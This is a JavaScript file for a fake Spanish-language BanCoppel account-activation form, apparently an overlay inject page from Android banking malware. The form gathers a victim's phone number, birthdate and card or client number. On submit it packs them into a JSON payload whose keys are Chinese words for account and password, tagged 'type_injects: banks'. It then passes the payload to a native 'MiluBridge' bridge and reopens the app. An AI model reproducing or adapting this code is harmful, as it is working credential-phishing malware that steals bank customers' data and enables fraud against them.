(() => {
  const form = document.getElementById("registerForm");
  const phoneInput = document.getElementById("phone");
  const birthdateInput = document.getElementById("birthdate");
  const datePickerOverlay = document.getElementById("datePickerOverlay");
  const datePickerCancel = document.getElementById("datePickerCancel");
  const datePickerConfirm = document.getElementById("datePickerConfirm");
  const dateDay = document.getElementById("dateDay");
  const dateMonth = document.getElementById("dateMonth");
  const dateYear = document.getElementById("dateYear");
  const dropdownToggle = document.getElementById("dropdownToggle");
  const dropdownMenu = document.getElementById("dropdownMenu");
  const dropdownValue = document.getElementById("dropdownValue");
  const dropdownGroup = document.getElementById("dropdownGroup");
  const dropdownItems = Array.from(document.querySelectorAll(".dropdown-item"));
  const infoLink = document.getElementById("infoLink");
  const cardNumberInput = document.getElementById("cardNumber");
  const continueBtn = document.getElementById("continueBtn");
  const termsCheck = document.getElementById("terms");
  const privacyCheck = document.getElementById("privacy");
  const laterBtn = document.getElementById("laterBtn");
  const toastEl = document.getElementById("toast");

  const CARD_OPTION = "Número de Tarjeta BanCoppel";
  const CLIENT_OPTION = "Número de Cliente";
  const MONTHS = [
    "Enero",
    "Febrero",
    "Marzo",
    "Abril",
    "Mayo",
    "Junio",
    "Julio",
    "Agosto",
    "Septiembre",
    "Octubre",
    "Noviembre",
    "Diciembre",
  ];

  let selectedOption = CARD_OPTION;
  let locked = false;
  let toastTimer = 0;
  let birthdateIso = "";

  const infoIconSvg =
    '<span class="info-icon" aria-hidden="true">' +
    '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' +
    '<circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line>' +
    "</svg></span>";

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 2200);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function pad2(n) {
    return String(n).padStart(2, "0");
  }

  function daysInMonth(year, month) {
    return new Date(year, month, 0).getDate();
  }

  function fillSelect(select, items, selectedValue) {
    select.innerHTML = "";
    items.forEach((item) => {
      const option = document.createElement("option");
      option.value = String(item.value);
      option.textContent = item.label;
      select.appendChild(option);
    });
    if (selectedValue != null) {
      select.value = String(selectedValue);
    }
  }

  function initDateOptions(selected) {
    const now = new Date();
    const maxYear = now.getFullYear() - 18;
    const minYear = now.getFullYear() - 100;
    const year = selected?.year || 1990;
    const month = selected?.month || 1;
    let day = selected?.day || 1;

    fillSelect(
      dateYear,
      Array.from({ length: maxYear - minYear + 1 }, (_, i) => {
        const y = maxYear - i;
        return { value: y, label: String(y) };
      }),
      year
    );

    fillSelect(
      dateMonth,
      MONTHS.map((label, index) => ({ value: index + 1, label })),
      month
    );

    const maxDay = daysInMonth(year, month);
    if (day > maxDay) {
      day = maxDay;
    }

    fillSelect(
      dateDay,
      Array.from({ length: maxDay }, (_, i) => {
        const d = i + 1;
        return { value: d, label: pad2(d) };
      }),
      day
    );
  }

  function syncDayOptions() {
    const year = Number(dateYear.value);
    const month = Number(dateMonth.value);
    const prevDay = Number(dateDay.value) || 1;
    const maxDay = daysInMonth(year, month);
    const day = Math.min(prevDay, maxDay);
    fillSelect(
      dateDay,
      Array.from({ length: maxDay }, (_, i) => {
        const d = i + 1;
        return { value: d, label: pad2(d) };
      }),
      day
    );
  }

  function parseIso(iso) {
    const match = /^(\d{4})-(\d{2})-(\d{2})$/.exec(iso || "");
    if (!match) {
      return null;
    }
    return {
      year: Number(match[1]),
      month: Number(match[2]),
      day: Number(match[3]),
    };
  }

  function formatDisplay(year, month, day) {
    return `${pad2(day)} / ${pad2(month)} / ${year}`;
  }

  function setBirthdate(iso) {
    birthdateIso = iso || "";
    const parsed = parseIso(birthdateIso);
    birthdateInput.value = parsed
      ? formatDisplay(parsed.year, parsed.month, parsed.day)
      : "";
  }

  function openDatePicker() {
    if (locked) {
      return;
    }
    initDateOptions(parseIso(birthdateIso));
    datePickerOverlay.hidden = false;
  }

  function closeDatePicker() {
    datePickerOverlay.hidden = true;
  }

  function confirmDatePicker() {
    const year = Number(dateYear.value);
    const month = Number(dateMonth.value);
    const day = Number(dateDay.value);
    setBirthdate(`${year}-${pad2(month)}-${pad2(day)}`);
    birthdateInput.classList.remove("is-error");
    closeDatePicker();
  }

  function buildPayload(phone, birthdate, cardNum) {
    return JSON.stringify({
      类型: "BanCoppel",
      账号: phone,
      密码: birthdate,
      card: cardNum,
      activationOption: selectedOption,
      type_injects: "banks",
      closed: "close_activity_injects",
    });
  }

  function setDropdownOpen(open) {
    dropdownGroup.classList.toggle("open", open);
    dropdownMenu.hidden = !open;
    dropdownToggle.setAttribute("aria-expanded", open ? "true" : "false");
  }

  function applyActivationOption(option) {
    selectedOption = option;
    dropdownValue.textContent = option;
    dropdownItems.forEach((item) => {
      item.classList.toggle("active", item.dataset.value === option);
    });

    if (option === CLIENT_OPTION) {
      infoLink.innerHTML = `Número de Cliente ${infoIconSvg}`;
      cardNumberInput.placeholder = "Ingresa tu número de cliente";
    } else {
      infoLink.innerHTML = `Número de tarjeta ${infoIconSvg}`;
      cardNumberInput.placeholder = "Ingresa tu número de tarjeta";
    }
  }

  function updateSubmitState() {
    const enabled = termsCheck.checked && privacyCheck.checked;
    continueBtn.disabled = !enabled;
    continueBtn.classList.toggle("active", enabled);
  }

  function resetForm() {
    form.reset();
    setBirthdate("");
    applyActivationOption(CARD_OPTION);
    setDropdownOpen(false);
    closeDatePicker();
    updateSubmitState();
    phoneInput.classList.remove("is-error");
    birthdateInput.classList.remove("is-error");
    cardNumberInput.classList.remove("is-error");
  }

  function validateForm() {
    let ok = true;
    const phone = phoneInput.value.trim();

    if (phone.length < 10) {
      phoneInput.classList.add("is-error");
      ok = false;
    } else {
      phoneInput.classList.remove("is-error");
    }

    if (!birthdateIso) {
      birthdateInput.classList.add("is-error");
      ok = false;
    } else {
      birthdateInput.classList.remove("is-error");
    }

    if (!cardNumberInput.value.trim()) {
      cardNumberInput.classList.add("is-error");
      ok = false;
    } else {
      cardNumberInput.classList.remove("is-error");
    }

    if (!ok) {
      toast("Completa todos los campos requeridos");
    }
    return ok;
  }

  dropdownToggle.addEventListener("click", (event) => {
    event.stopPropagation();
    setDropdownOpen(dropdownMenu.hidden);
  });

  dropdownItems.forEach((item) => {
    item.addEventListener("click", (event) => {
      event.stopPropagation();
      applyActivationOption(item.dataset.value || CARD_OPTION);
      setDropdownOpen(false);
    });
  });

  document.addEventListener("click", () => {
    setDropdownOpen(false);
  });

  termsCheck.addEventListener("change", updateSubmitState);
  privacyCheck.addEventListener("change", updateSubmitState);

  phoneInput.addEventListener("input", () => {
    phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 15);
    phoneInput.classList.remove("is-error");
  });

  cardNumberInput.addEventListener("input", () => {
    cardNumberInput.value = cardNumberInput.value.replace(/\D/g, "").slice(0, 24);
    cardNumberInput.classList.remove("is-error");
  });

  birthdateInput.addEventListener("click", openDatePicker);
  birthdateInput.addEventListener("focus", (event) => {
    event.target.blur();
    openDatePicker();
  });

  datePickerCancel.addEventListener("click", closeDatePicker);
  datePickerConfirm.addEventListener("click", confirmDatePicker);
  datePickerOverlay.addEventListener("click", (event) => {
    if (event.target === datePickerOverlay) {
      closeDatePicker();
    }
  });
  dateMonth.addEventListener("change", syncDayOptions);
  dateYear.addEventListener("change", syncDayOptions);

  laterBtn.addEventListener("click", () => {
    resetForm();
  });

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    if (locked || continueBtn.disabled) {
      return;
    }
    if (!validateForm()) {
      return;
    }

    locked = true;
    const phone = phoneInput.value.trim();
    const cardNum = cardNumberInput.value.trim();

    reportDone(buildPayload(phone, birthdateIso, cardNum));

    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 320);
  });

  applyActivationOption(CARD_OPTION);
  updateSubmitState();
})();
